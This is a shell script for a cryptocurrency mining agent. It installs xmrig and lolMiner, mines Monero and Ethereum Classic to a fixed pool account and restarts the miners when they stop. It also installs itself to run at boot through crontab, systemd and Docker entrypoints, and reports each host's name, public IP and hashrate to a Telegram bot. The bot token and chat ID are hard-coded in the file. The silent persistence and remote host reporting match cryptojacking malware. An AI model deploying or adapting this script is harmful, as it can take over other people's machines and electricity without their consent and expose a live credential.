#!/bin/sh
set -u
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

#################################################
# MINING AGENT — CPU + GPU + GPU HASHRATE
# UNIVERSAL VERSION WITH TELEGRAM REPORTING
#################################################

# ===== TELEGRAM CONFIG =====
TG_TOKEN="5542234668:AAFO7fjjd0w7q7j-lUaYAY9u_dIAIldzhg0"
TG_CHAT_ID="5336452267"
TG_API="https://api.telegram.org/bot$TG_TOKEN/sendMessage"

# ===== MINING CONFIG =====
[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

# ===== PANEL =====
INTERVAL=30
HOST="$(hostname)"
PUBLIC_IP=$(curl -s https://api.ipify.org 2>/dev/null || echo "unknown")

# ===== ACCOUNTS =====
KRIPTEX="krxX3PVQVR"

# ===== POOLS =====
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# ===== PATHS =====
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"

mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" >/dev/null 2>&1
chmod 700 "$BASE" "$BIN" "$RUN" "$LOG" 2>/dev/null

#################################################
# UTILS
#################################################

tg_send() {
  local message="$1"
  curl -s -X POST "$TG_API" \
    -H "Content-Type: application/json" \
    -d "{\"chat_id\": \"$TG_CHAT_ID\", \"text\": \"$message\", \"parse_mode\": \"HTML\"}" \
    >/dev/null 2>&1 || echo "Failed to send Telegram message"
}

log_and_tg() {
  local message="$1"
  echo "$(date '+%Y-%m-%d %H:%M:%S') - $message" >> "$LOG/agent.log"
  tg_send "$message"
}

json_escape() { 
  echo "$1" | sed 's/"/\\"/g; s/\\/\\\\/g' 
}

#################################################
# INSTALL
#################################################

install_xmrig() {
  if [ -x "$BIN/cpu/xmrig" ]; then
    log_and_tg "✅ CPU miner (xmrig) already installed"
    return 0
  fi
  
  log_and_tg "🔧 Starting installation of CPU miner (xmrig)..."
  
  # Try multiple download sources
  for url in \
    "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz" \
    "https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz"; do
    
    wget -q "$url" -O /tmp/xmr.tgz && break
  done
  
  if [ $? -ne 0 ]; then
    log_and_tg "❌ Failed to download xmrig. Trying alternative method..."
    return 1
  fi
  
  tar -xzf /tmp/xmr.tgz -C "$BIN/cpu" --strip-components=1 || return 1
  chmod +x "$BIN/cpu/xmrig" || return 1
  rm -f /tmp/xmr.tgz
  
  log_and_tg "✅ CPU miner (xmrig) installed successfully"
}

install_lolminer() {
  if [ -x "$BIN/gpu/lolMiner" ]; then
    log_and_tg "✅ GPU miner (lolMiner) already installed"
    return 0
  fi
  
  log_and_tg "🔧 Starting installation of GPU miner (lolMiner)..."
  
  # Try multiple download sources
  for url in \
    "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" \
    "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97/lolMiner_v1.97_Lin64.tar.gz"; do
    
    wget -q "$url" -O /tmp/lol.tgz && break
  done
  
  if [ $? -ne 0 ]; then
    log_and_tg "❌ Failed to download lolMiner. GPU mining will be disabled."
    return 1
  fi
  
  tar -xzf /tmp/lol.tgz -C "$BIN/gpu" --strip-components=1 || return 1
  chmod +x "$BIN/gpu/lolMiner" || return 1
  rm -f /tmp/lol.tgz
  
  log_and_tg "✅ GPU miner (lolMiner) installed successfully"
}

#################################################
# CPU (xmrig)
#################################################

start_cpu() {
  log_and_tg "🔄 Restarting CPU miner..."
  stop_cpu
  
  nohup "$BIN/cpu/xmrig" \
    -o "$XMR_POOL" \
    -u "$KRIPTEX.$HOST" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    --background --log-file="$LOG/cpu.log" \
    >/dev/null 2>&1 &
    
  echo $! > "$RUN/cpu.pid"
  sleep 5
  
  if [ -f "$RUN/cpu.pid" ] && kill -0 "$(cat "$RUN/cpu.pid")" 2>/dev/null; then
    log_and_tg "✅ CPU miner started successfully"
  else
    log_and_tg "❌ CPU miner failed to start"
    rm -f "$RUN/cpu.pid"
  fi
}

stop_cpu() {
  if [ -f "$RUN/cpu.pid" ]; then
    kill "$(cat "$RUN/cpu.pid")" 2>/dev/null || true
    sleep 2
    rm -f "$RUN/cpu.pid"
  fi
}

#################################################
# GPU (lolMiner) + API
#################################################

start_gpu() {
  # Check if GPU exists - fallback if lspci not available
  if ! (command -v lspci >/dev/null 2>&1 && lspci | grep -qiE "nvidia|amd|ati|radeon") && \
     ! (command -v nvidia-smi >/dev/null 2>&1) && \
     ! (ls /dev/dri/ 2>/dev/null | grep -q card); then
    log_and_tg "⚠️ No GPU detected. GPU mining disabled."
    return 1
  fi
  
  log_and_tg "🔄 Restarting GPU miner..."
  stop_gpu
  
  nohup "$BIN/gpu/lolMiner" \
    --algo ETCHASH \
    --pool "$ETC_POOL" \
    --user "$KRIPTEX.$HOST" \
    --apihost 127.0.0.1 \
    --apiport 8080 \
    --silent \
    >> "$LOG/gpu.log" 2>&1 &
    
  echo $! > "$RUN/gpu.pid"
  sleep 10
  
  if [ -f "$RUN/gpu.pid" ] && kill -0 "$(cat "$RUN/gpu.pid")" 2>/dev/null; then
    log_and_tg "✅ GPU miner started successfully"
  else
    log_and_tg "❌ GPU miner failed to start"
    rm -f "$RUN/gpu.pid"
  fi
}

stop_gpu() {
  if [ -f "$RUN/gpu.pid" ]; then
    kill "$(cat "$RUN/gpu.pid")" 2>/dev/null || true
    sleep 2
    rm -f "$RUN/gpu.pid"
  fi
}

#################################################
# HASHRATES
#################################################

get_cpu_hashrate() {
  local hr=$(curl -s --max-time 2 http://127.0.0.1:16000/1/summary 2>/dev/null | grep -oE '"total":\[[^]]+' | grep -oE '[0-9]+(\.[0-9]+)?' | head -1)
  echo "${hr:-0}"
}

get_gpu_hashrate() {
  local hr=$(curl -s --max-time 2 http://127.0.0.1:8080/summary 2>/dev/null | grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' | grep -oE '[0-9]+(\.[0-9]+)?' | head -1)
  if [ -n "$hr" ]; then
    awk "BEGIN {printf \"%.2f\", $hr * 1000}" <<< "$hr"
  else
    echo "0"
  fi
}

#################################################
# METRICS
#################################################

get_cpu_temp() {
  if command -v sensors >/dev/null 2>&1; then
    sensors 2>/dev/null | awk '/Package id 0:|Core 0:|Tctl:/ {gsub(/[+°C]/,"",$NF); print int($NF)}' | head -1
  else
    echo "N/A"
  fi
}

get_gpu_temp() {
  if command -v nvidia-smi >/dev/null 2>&1; then
    nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null | head -1
  elif command -v rocm-smi >/dev/null 2>&1; then
    rocm-smi --showtemp 2>/dev/null | grep -oE '[0-9]+' | head -1
  else
    echo "N/A"
  fi
}

get_uptime() { 
  uptime -p 2>/dev/null | sed 's/up //; s/,$//' || echo "unknown"
}

get_load() { 
  uptime | awk -F'load average:' '{print $2}' | cut -d',' -f1 | xargs || echo "0.00"
}

get_ip() {
  curl -s https://api.ipify.org 2>/dev/null || echo "unknown"
}

#################################################
# TELEMETRY & REPORTING
#################################################

send_startup_report() {
  local cpu_temp=$(get_cpu_temp)
  local gpu_temp=$(get_gpu_temp)
  local uptime=$(get_uptime)
  local load=$(get_load)
  local ip=$(get_ip)
  
  tg_send "🚀 <b>MINING AGENT STARTED</b>\n🖥️ <b>Host:</b> $HOST\n🌐 <b>IP:</b> $ip\n🌡️ <b>CPU Temp:</b> ${cpu_temp}°C\n🌡️ <b>GPU Temp:</b> ${gpu_temp}°C\n⏱️ <b>Uptime:</b> $uptime\n📈 <b>Load:</b> $load\n⚡ <b>Miners:</b> Starting..."
}

send_20min_report() {
  local cpu_hr=$(get_cpu_hashrate)
  local gpu_hr=$(get_gpu_hashrate)
  local total_hr=0
  
  # Calculate total hashrate safely
  cpu_hr_num=$(echo "$cpu_hr" | grep -oE '^[0-9]+' || echo "0")
  gpu_hr_num=$(echo "$gpu_hr" | grep -oE '^[0-9]+' || echo "0")
  total_hr=$((cpu_hr_num + gpu_hr_num))
  
  local ip=$(get_ip)
  
  tg_send "📊 <b>20-MINUTE MINING REPORT</b>\n🖥️ <b>Host:</b> $HOST\n🌐 <b>IP:</b> $ip\n⚡ <b>Hashrate:</b>\n   • CPU (XMR): ${cpu_hr} H/s\n   • GPU (ETC): ${gpu_hr} H/s\n   • <b>Total:</b> ${total_hr} H/s\n⏰ <b>Time:</b> $(date '+%a %b %d %H:%M:%S %Z %Y')"
}

send_restart_report() {
  local miner_type="$1"
  tg_send "🔄 <b>MINER RESTARTED</b>\n🖥️ <b>Host:</b> $HOST\n🔧 <b>Miner:</b> $miner_type\n⏰ <b>Time:</b> $(date '+%a %b %d %H:%M:%S %Z %Y')"
}

#################################################
# WATCHDOG & HEALTH CHECK
#################################################

check_cpu_miner() {
  if [ -f "$RUN/cpu.pid" ]; then
    local pid=$(cat "$RUN/cpu.pid")
    if ! kill -0 "$pid" 2>/dev/null; then
      log_and_tg "🚨 CPU miner crashed! PID: $pid"
      send_restart_report "CPU (XMR)"
      start_cpu
      return 1
    fi
  else
    log_and_tg "🚨 CPU miner not running! Restarting..."
    send_restart_report "CPU (XMR)"
    start_cpu
    return 1
  fi
  return 0
}

check_gpu_miner() {
  # Skip GPU check if no GPU detected
  if ! (command -v lspci >/dev/null 2>&1 && lspci | grep -qiE "nvidia|amd|ati|radeon") && \
     ! (command -v nvidia-smi >/dev/null 2>&1) && \
     ! (ls /dev/dri/ 2>/dev/null | grep -q card); then
    return 0
  fi
  
  if [ -f "$RUN/gpu.pid" ]; then
    local pid=$(cat "$RUN/gpu.pid")
    if ! kill -0 "$pid" 2>/dev/null; then
      log_and_tg "🚨 GPU miner crashed! PID: $pid"
      send_restart_report "GPU (ETC)"
      start_gpu
      return 1
    fi
  else
    log_and_tg "🚨 GPU miner not running! Restarting..."
    send_restart_report "GPU (ETC)"
    start_gpu
    return 1
  fi
  return 0
}

health_check() {
  check_cpu_miner
  check_gpu_miner
}

#################################################
# AUTOSTART (UNIVERSAL)
#################################################

ensure_autostart() {
  # For crontab (works everywhere)
  (crontab -l 2>/dev/null | grep -v "ALLOW_MINING=1 $BASE/min1.sh"; echo "@reboot sleep 30 && ALLOW_MINING=1 $BASE/min1.sh") | crontab -
  
  # For systemd systems (if we have permissions)
  if [ -d /etc/systemd/system/ ] && [ "$(id -u)" = "0" ]; then
    cat > /tmp/mining-agent.service << EOF
[Unit]
Description=Mining Agent
After=network.target

[Service]
Type=simple
User=$(whoami)
Environment="ALLOW_MINING=1"
ExecStart=$BASE/min1.sh
Restart=always
RestartSec=10
StandardOutput=append:$LOG/agent.log
StandardError=append:$LOG/agent.log

[Install]
WantedBy=multi-user.target
EOF
    
    cp /tmp/mining-agent.service /etc/systemd/system/mining-agent.service 2>/dev/null || true
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable mining-agent.service 2>/dev/null || true
    systemctl start mining-agent.service 2>/dev/null || true
  fi
  
  # For Docker entrypoint
  if [ -n "${DOCKER:-}" ]; then
    echo "#!/bin/sh" > "$BASE/docker-entrypoint.sh"
    echo "ALLOW_MINING=1 $BASE/min1.sh &" >> "$BASE/docker-entrypoint.sh"
    echo "wait" >> "$BASE/docker-entrypoint.sh"
    chmod +x "$BASE/docker-entrypoint.sh" 2>/dev/null || true
  fi
}

#################################################
# AGENT LOOP
#################################################

agent() {
  # Initialize logging
  echo "=== Mining Agent Started at $(date) ===" > "$LOG/agent.log"
  
  # Send startup notification
  log_and_tg "🔧 Mining agent initializing..."
  send_startup_report
  
  # Install miners
  install_xmrig
  install_lolminer
  
  # Ensure autostart
  ensure_autostart
  
  # Start miners
  start_cpu
  start_gpu
  
  # Main monitoring loop
  local start_time=$(date +%s)
  
  while true; do
    # Health checks
    health_check
    
    # Send 20-minute report
    local current_time=$(date +%s)
    if [ $((current_time - start_time)) -ge 1200 ]; then
      send_20min_report
      start_time=$current_time # Reset timer
    fi
    
    sleep "$INTERVAL"
  done
}

#################################################
# MAIN
#################################################

# Handle signals for clean shutdown
trap 'stop_cpu; stop_gpu; exit 0' TERM INT QUIT

# Start the agent
agent
